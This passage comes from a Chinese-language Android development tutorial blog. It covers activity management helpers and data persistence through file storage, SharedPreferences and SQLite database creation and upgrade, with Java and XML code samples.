class="keyword">for</span> (Activity activity : activities)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!activity.isFinishing())&#123;</span><br><span class="line">                activity.finish();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下面修改BASEActivity中的代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BaseActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        Log.d(<span class="string">"BaseActivity"</span>, getClass().getSimpleName());</span><br><span class="line">        ActivityCollector.addActivity(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onDestroy</span><span class="params">()</span></span>&#123;</span><br><span class="line">    	<span class="keyword">super</span>.onDestroy();</span><br><span class="line">        ActivityCollector.removeActivity(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从此，不管在什么地方想要退出程序，只需要调用ActivityCollector.FinishAll()就可以了。</p>
<p>另外，可以使用如下代码杀掉当前进程：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">android.os.Process.killProcess(android.os.Process.myPid());</span><br></pre></td></tr></table></figure>

<h3 id="启动活动的最佳写法"><a href="#启动活动的最佳写法" class="headerlink" title="启动活动的最佳写法"></a>启动活动的最佳写法</h3><p>比如在SecondActivity中添加如下代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">actionStart</span><span class="params">(Context context, String data1, String data2)</span></span>&#123;</span><br><span class="line">    Intent intent=<span class="keyword">new</span> Intent(context, SecondActivity<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    intent.purExtra(<span class="string">"param1"</span>, data1);</span><br><span class="line">    intent.purExtra(<span class="string">"param1"</span>, data2);</span><br><span class="line">    context.startActivity(intent);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样修改后，如果要在FirstActivity中启动SecondActivity，使用以下代码即可：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">SecondActivity.actionStart(FirstActivity.<span class="keyword">this</span>, <span class="string">"data1"</span>, <span class="string">"data2"</span>);</span><br></pre></td></tr></table></figure>

<p>这样做的好处就是可以明确知道传递的参数。</p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>Android-day5</title>
    <url>/2020/05/29/Android/Android-day5/</url>
    <content><![CDATA[<h1 id="持久化技术详解"><a href="#持久化技术详解" class="headerlink" title="持久化技术详解"></a>持久化技术详解</h1><h2 id="持久化技术简介"><a href="#持久化技术简介" class="headerlink" title="持久化技术简介"></a>持久化技术简介</h2><p>数据持久化就是指将那些内存中的瞬时数据保存到存储设备中，保证即使在手机或电脑关机的情况下，这些数据仍然不会丢失。</p>
<p>保存在内存中的数据是处于瞬时状态的，而保存在存储设备中的数据是处于持久状态的，持久化技术则提供了一种机制可以让数据再瞬时状态和持久状态之间进行转换。</p>
<p>Android系统中主要提供了3种方式用于简单地实现数据持久化功能，即文件存储、sharedPreference存储以及数据库存储。</p>
<h2 id="文件存储"><a href="#文件存储" class="headerlink" title="文件存储"></a>文件存储</h2><p>文件存储是Android中最基本的一种数据存储方式，它不对存储的内容进行任何的格式化处理，所有的数据都是原封不动地保存到文件当中的。</p>
<h3 id="将数据存储到文件中"><a href="#将数据存储到文件中" class="headerlink" title="将数据存储到文件中"></a>将数据存储到文件中</h3><p>Context类提供了一个openFileOutput()方法，可以用于将数据存储到指定的文件中。这个方法有两个参数，第一个是文件名（注意，不可以包含路径，默认都是存储到<code>/data/data/&lt;packagename&gt;/files/</code>目录下的），第二个超时的文件的操作模式，可选的有MODE_PRIVATE（默认的操作方式，为覆写模式）和MOD_APPEND（为追加模式）。</p>
<p>openFileOutput()方法返回的是一个FileOutputStream对象，得到这个对象之后就可以使用java流的方式将数据写到文件中了。</p>
<p>下面新建一个FilePersistenceTest项目，并添加EditText控件：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:orientation</span>=<span class="string">"vertical"</span> <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">EditText</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/edit"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"Type something here"</span></span></span><br><span class="line"><span class="tag">        /&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后修改MainActivity中的代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> EditText edit;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        edit = (EditText) findViewById(R.id.edit);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onDestroy</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onDestroy();</span><br><span class="line">        String inputText = edit.getText().toString();</span><br><span class="line">        save(inputText);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">save</span><span class="params">(String inputText)</span></span>&#123;</span><br><span class="line">        FileOutputStream out = <span class="keyword">null</span>;</span><br><span class="line">        BufferedWriter writer = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            out = openFileOutput(<span class="string">"data"</span>, Context.MODE_PRIVATE);</span><br><span class="line">            writer = <span class="keyword">new</span> BufferedWriter(<span class="keyword">new</span> OutputStreamWriter(out));</span><br><span class="line">            writer.write(inputText);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(writer != <span class="keyword">null</span>)&#123;</span><br><span class="line">                    writer.close();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span>(IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样在活动销毁前就可以保存数据到data文件中了。</p>
<h2 id="从文本中读取数据"><a href="#从文本中读取数据" class="headerlink" title="从文本中读取数据"></a>从文本中读取数据</h2><p>Context类还提供了openFileInput()方法，用于从文件中读取数据。它只接收一个参数，即要读取的文件名，然后系统会自动到<code>/data/data/&lt;packagename&gt;/files/</code>目录下去加载这个文件，并返回一个FileInputStram对象。</p>
<p>继续完善代码使得重启后能够保留上次输入的内容：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> EditText edit;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        edit = (EditText) findViewById(R.id.edit);</span><br><span class="line">        String inputText = load();</span><br><span class="line">        <span class="keyword">if</span>(!TextUtils.isEmpty(inputText))&#123;</span><br><span class="line">            edit.setText(inputText);</span><br><span class="line">            edit.setSelection(inputText.length());</span><br><span class="line">            Toast.makeText(<span class="keyword">this</span>, <span class="string">"Restoring succeeded"</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onDestroy</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onDestroy();</span><br><span class="line">        String inputText = edit.getText().toString();</span><br><span class="line">        save(inputText);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">save</span><span class="params">(String inputText)</span></span>&#123;</span><br><span class="line">        FileOutputStream out = <span class="keyword">null</span>;</span><br><span class="line">        BufferedWriter writer = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            out = openFileOutput(<span class="string">"data"</span>, Context.MODE_PRIVATE);</span><br><span class="line">            writer = <span class="keyword">new</span> BufferedWriter(<span class="keyword">new</span> OutputStreamWriter(out));</span><br><span class="line">            writer.write(inputText);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(writer != <span class="keyword">null</span>)&#123;</span><br><span class="line">                    writer.close();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span>(IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">load</span><span class="params">()</span></span>&#123;</span><br><span class="line">        FileInputStream in = <span class="keyword">null</span>;</span><br><span class="line">        BufferedReader reader = <span class="keyword">null</span>;</span><br><span class="line">        StringBuilder content = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            in = openFileInput(<span class="string">"data"</span>);</span><br><span class="line">            reader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(in));</span><br><span class="line">            String line = <span class="string">""</span>;</span><br><span class="line">            <span class="keyword">while</span>((line = reader.readLine()) != <span class="keyword">null</span>)&#123;</span><br><span class="line">                content.append(line);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(reader != <span class="keyword">null</span>)&#123;</span><br><span class="line">                    reader.close();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span>(IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> content.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样重启程序后就能恢复文本内容了。</p>
<h2 id="SharedPreferences存储"><a href="#SharedPreferences存储" class="headerlink" title="SharedPreferences存储"></a>SharedPreferences存储</h2><p>SharedPreferences是使用键值对的方式来存储数据的，同时还支持多种不同的数据类型存储。</p>
<h3 id="将数据存储到SharedPreferences中"><a href="#将数据存储到SharedPreferences中" class="headerlink" title="将数据存储到SharedPreferences中"></a>将数据存储到SharedPreferences中</h3><h4 id="获取SharedPreference对象"><a href="#获取SharedPreference对象" class="headerlink" title="获取SharedPreference对象"></a>获取SharedPreference对象</h4><p>首先要获取到SharedPreference对象，Android中主要提供了3种方法用于得到SharedPreference对象。</p>
<h5 id="Context类中的getSharedPreference-方法"><a href="#Context类中的getSharedPreference-方法" class="headerlink" title="Context类中的getSharedPreference()方法"></a>Context类中的getSharedPreference()方法</h5><p>此类接收两个参数，第一个用于指定文件名称，存放在<code>/data/data/&lt;packagename&gt;/shared_prefs/</code>目录下；第二个参数用于指定操作模式，默认是MODE_PRIVATE，和之间传入0效果相同，表示只有当前的应用程序才可以对这个SharedPreferences文件进行读写。</p>
<h5 id="Activity类中的getPreferences-方法"><a href="#Activity类中的getPreferences-方法" class="headerlink" title="Activity类中的getPreferences()方法"></a>Activity类中的getPreferences()方法</h5><p>与上一个方法相似，不过只接收一个操作模式参数，当前活动的类名会被作为SharedPreferences的文件名。</p>
<h5 id="PreferenceManager类中的getDafaultSharedPreferences-方法"><a href="#PreferenceManager类中的getDafaultSharedPreferences-方法" class="headerlink" title="PreferenceManager类中的getDafaultSharedPreferences()方法"></a>PreferenceManager类中的getDafaultSharedPreferences()方法</h5><p>这是一个静态方法，接收一个Context参数，并自动使用当前应用程序的包名作为前缀来命名SharedPreferences文件。</p>
<h4 id="向SharedPreferences文件中存储数据"><a href="#向SharedPreferences文件中存储数据" class="headerlink" title="向SharedPreferences文件中存储数据"></a>向SharedPreferences文件中存储数据</h4><p>主要可以分3步实现：</p>
<ol>
<li>调用SharedPreferences对象的edit()方法来获取一个SharedPreferences.Editor对象。</li>
<li>向SharedPreferences.Editor对象中添加数据，如putString()等。</li>
<li>调用apply()方法将添加的数据提交，从而完成数据存储操作。</li>
</ol>
<h4 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h4><p>新建SharedPreferences项目，然后添加一个Button按钮。</p>
<p>然后修改代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        Button button = findViewById(R.id.save);</span><br><span class="line">        button.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span></span>&#123;</span><br><span class="line">                SharedPreferences.Editor editor = getSharedPreferences(<span class="string">"data"</span>, MODE_PRIVATE).edit();</span><br><span class="line">                editor.putString(<span class="string">"name"</span>, <span class="string">"nuoye"</span>);</span><br><span class="line">                editor.putInt(<span class="string">"age"</span>, <span class="number">21</span>);</span><br><span class="line">                editor.putBoolean(<span class="string">"married"</span>, <span class="keyword">false</span>);</span><br><span class="line">                editor.apply();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后在文件浏览器里打开可以发现是以xml格式存储的。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version='1.0' encoding='utf-8' standalone='yes' ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">map</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">"name"</span>&gt;</span>nuoye<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">boolean</span> <span class="attr">name</span>=<span class="string">"married"</span> <span class="attr">value</span>=<span class="string">"false"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">int</span> <span class="attr">name</span>=<span class="string">"age"</span> <span class="attr">value</span>=<span class="string">"21"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="从SharePreferences中读取数据"><a href="#从SharePreferences中读取数据" class="headerlink" title="从SharePreferences中读取数据"></a>从SharePreferences中读取数据</h3><p>SharedPreferences对象中提供了一系列get方法，与put是一样对应的，其包含两个参数，第一个参数是键值，第二个参数是默认值，即表示当传入的键值找不到时就会返回默认值。</p>
<p>添加一个restore的按钮，然后修改代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        Button button1 = findViewById(R.id.save);</span><br><span class="line">        Button button2 = findViewById(R.id.restore);</span><br><span class="line">        button1.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span></span>&#123;</span><br><span class="line">                SharedPreferences.Editor editor = getSharedPreferences(<span class="string">"data"</span>, MODE_PRIVATE).edit();</span><br><span class="line">                editor.putString(<span class="string">"name"</span>, <span class="string">"nuoye"</span>);</span><br><span class="line">                editor.putInt(<span class="string">"age"</span>, <span class="number">21</span>);</span><br><span class="line">                editor.putBoolean(<span class="string">"married"</span>, <span class="keyword">false</span>);</span><br><span class="line">                editor.apply();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        button2.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span></span>&#123;</span><br><span class="line">                SharedPreferences pref = getSharedPreferences(<span class="string">"data"</span>, MODE_PRIVATE);</span><br><span class="line">                String name = pref.getString(<span class="string">"name"</span>, <span class="string">"nobody"</span>);</span><br><span class="line">                <span class="keyword">int</span> age = pref.getInt(<span class="string">"age"</span>, <span class="number">0</span>);</span><br><span class="line">                Boolean married = pref.getBoolean(<span class="string">"married"</span>, <span class="keyword">true</span>);</span><br><span class="line">                Log.d(<span class="string">"MainActivity"</span>, <span class="string">"name is "</span>+ name);</span><br><span class="line">                Log.d(<span class="string">"MainActivity"</span>, <span class="string">"age is "</span>+ age);</span><br><span class="line">                Log.d(<span class="string">"MainActivity"</span>, <span class="string">"married is "</span>+ married);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样即可完成从SharedPreferences中存储和读取数据了。</p>
<h2 id="SQLite数据库存储"><a href="#SQLite数据库存储" class="headerlink" title="SQLite数据库存储"></a>SQLite数据库存储</h2><p>SQLite是一款轻量级的关系型数据库，不仅支持SQL语法，还遵循了数据库的ACID事务，并且不需要设置用户名和密码就可以使用。</p>
<h3 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h3><p>Android提供了SQLiteOpenHelper帮助类，借助这个类可以非常简单地对数据库进行创建和升级。</p>
<p>SQLiteOpenHelper有两个抽象方法，分别是onCreate()和onUpgrade()，我们必须在自己的帮助类里重写这两个方法。</p>
<p>SQLiteOpenHelper还有两个重要的实例方法：getReadableDatabase()和getWritableDatabase()。这两个方法都可以创建或打开一个现有的数据库，并返回一个可对数据库进行读写操作的对象。</p>
<p>SQLiteOpenHelper中有两个构造方法可供重写，一般使用参数少的那个，其参数有4个，分别是Context，数据库名，Cursor（一般传入null），数据库版本号（可用于对数据库进行升级操作）。</p>
<p>数据库文件会存放在<code>/data/data/&lt;packagename&gt;/database/</code>目录下。</p>
<p>接下来新建一个DatabaseTest项目以体验其用法。</p>
<p>新建类MyDatabaseHelper，代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyDatabaseHelper</span> <span class="keyword">extends</span> <span class="title">SQLiteOpenHelper</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String CREATE_BOOK = <span class="string">"create table Book("</span></span><br><span class="line">            + <span class="string">"id integer primary key autoincrement, "</span></span><br><span class="line">            + <span class="string">"auto text, "</span></span><br><span class="line">            + <span class="string">"price real, "</span></span><br><span class="line">            + <span class="string">"pages integer, "</span></span><br><span class="line">            + <span class="string">"name text)"</span>;</span><br><span class="line">    <span class="keyword">private</span> Context mContext;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyDatabaseHelper</span><span class="params">(Context context, String name,</span></span></span><br><span class="line"><span class="function"><span class="params">                           SQLiteDatabase.CursorFactory factory, <span class="keyword">int</span> version)</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(context, name, factory, version);</span><br><span class="line">        mContext = context;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(SQLiteDatabase db)</span></span>&#123;</span><br><span class="line">        db.execSQL(CREATE_BOOK);</span><br><span class="line">        Toast.makeText(mContext, <span class="string">"Create succeeded"</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onUpgrade</span><span class="params">(SQLiteDatabase db, <span class="keyword">int</span> oldVersion, <span class="keyword">int</span> newVersion)</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后添加一个Button，再修改代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> MyDatabaseHelper dbHelper;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        dbHelper = <span class="keyword">new</span> MyDatabaseHelper(<span class="keyword">this</span>, <span class="string">"bookstore.db"</span>, <span class="keyword">null</span>, <span class="number">2</span>);</span><br><span class="line">        Button create_database = (Button) findViewById(R.id.create_database);</span><br><span class="line">        create_database.setOnClickListener(<span class="keyword">new</span> View.OnClickListener()&#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span></span>&#123;</span><br><span class="line">                dbHelper.getWritableDatabase();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行后可以发现弹出了Toast信息，然后这里用adb来查看下：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ adb shell</span><br><span class="line">$ <span class="built_in">cd</span> /data/data/com.example.databasetest/databases</span><br><span class="line">$ sqlite3 bookstore.db</span><br><span class="line">sqlite&gt; .table</span><br><span class="line">Book              android_metadata</span><br><span class="line">sqlite&gt; .<span class="built_in">exit</span></span><br></pre></td></tr></table></figure>

<p>可以看到Book数据库已经创建成功了。</p>
<h3 id="升级数据库"><a href="#升级数据库" class="headerlink" title="升级数据库"></a>升级数据库</h3><p>升级数据库是用到onUpgrade()这个方法。</p>
<p>我们可以在MyDatabaseHelper修改：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyDatabaseHelper</span> <span class="keyword">extends</span> <span class="title">SQLiteOpenHelper</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String CREATE_BOOK = <span class="string">"create table Book("</span></span><br><span class="line">            + <span class="string">"id integer primary key autoincrement, "</span></span><br><span class="line">            + <span class="string">"auto text, "</span></span><br><span class="line">            + <span class="string">"price real, "</span></span><br><span class="line">            + <span class="string">"pages integer, "</span></span><br><span class="line">            + <span class="string">"name text)"</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String CREATE_CATEGORY = <span class="string">"create table Category("</span></span><br><span class="line">            + <span class="string">"id integer primary key autoincrement, "</span></span><br><span class="line">            + <span class="string">"category_name text, "</span></span><br><span class="line">            + <span class="string">"category_code integer)"</span>;</span><br><span class="line">    <span class="keyword">private</span> Context mContext;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyDatabaseHelper</span><span class="params">(Context context, String name,</span></span></span><br><span class="line"><span class="function"><span class="params">                            SQLiteDatabase.CursorFactory factory, <span class="keyword">int</span> version)</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(context, name, factory, version);</span><br><span class="line">        mContext = context;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(SQLiteDatabase db)</span></span>&#123;</span><br><span class="line">        db.execSQL(CREATE_BOOK);</span><br><span class="line">        db.execSQL(CREATE_CATEGORY);</span><br><span class="line">        Toast.makeText(mContext, <span class="string">"Create succeeded"</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onUpgrade</span><span class="params">(SQLiteDatabase db, <span class="keyword">int</span> oldVersion, <span class="keyword">int</span> newVersion)</span></span>&#123;</span><br><span class="line">        db.execSQL(<span class="string">"drop table if exists Book"</span>);</span><br><span class="line">        db.execSQL(<span class="string">"drop table if exists Category"</span>);</span><br><span class="line">        onCreate(db);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后修改MainActivity中的这一行代码，把版本号改为2：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">dbHelp = <span class="keyword">new</span> MyDatabaseHelper(<span class="keyword">this</span>, <span class="string">"bookstore.db"</span>, <span class="keyword">null</span>, <span class="number">2</span>);</span><br></pre></td></tr></table></figure>

<p>这样就可以对数据库进行升级了。</p>
<h3 id="添加数据"><a href="#添加数据" class="headerlink" title="添加数据"></a>添加数据</h3><p>可以直接使用SQL语句完成操作。</p>
<p>另外SQLiteDatabase中提供了insert()方法，有三个参数，第一个参数是表明；第二个参数用于在未指定添加数据的情况下给某些可能为空的列自动赋值，一般传入null；第三个参数是一个ContentValues对象，提供了一系列put()方法重载，用于向ContentValues中添加数据。</p>
<p>首先添加按钮，然后添加如下代码：</p>
